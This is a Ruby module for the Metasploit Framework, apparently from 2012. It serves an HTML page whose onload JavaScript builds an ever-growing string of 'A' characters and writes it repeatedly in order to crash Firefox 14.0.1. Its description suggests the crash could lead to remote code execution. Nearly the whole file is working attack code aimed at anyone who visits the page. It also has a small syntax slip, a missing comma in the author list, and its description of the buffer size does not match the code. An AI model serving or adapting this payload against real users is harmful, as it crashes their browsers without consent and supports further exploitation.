##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = NormalRanking
	include Msf::Exploit::Remote::HttpServer::HTML
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Firefox Javascript DoS',
			'Description'    => %q{
					Firefox 14.0.1 crashes when a buffer of 2400 A's are created and then called via document.write(A's) Likely to cause a RCE if someone has the time to inspect with IDA...
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'kaveh ghaemmaghami <kavehghaemmaghami(at)googlemail(dot)com>' # Disclosure
					'phillips321 <phillips321(at)gmail(dot)com>', # Metasploit code
					'Ben Campbell <eat_meatballs(at)hotmail(dot)co(dot)uk>',
					'Richard Hicks <scriptmonkeyblog(at)gmail(dot)com>'
				],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://seclists.org/fulldisclosure/2012/Jul/385']
				],
			'Platform'       => ['win', 'linux'],
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 31 2012'))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		url =  "http://"
		url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		url += ":" + datastore['SRVPORT'].to_s + get_resource() + "/"
		content = "<html><body onload=\"javascript:exploit();\"><p>Trying exploit...</p><script language=\"JavaScript\">function exploit(){var buf = '\x41\x41\x41';for(i=0; i <= 800 ; ++i){buf+=buf+buf;document.write(buf);}}</script></body></html>"
		print_status("Sending exploit HTML")
		send_response_html(cli, content)
		handler(cli)
	end
end
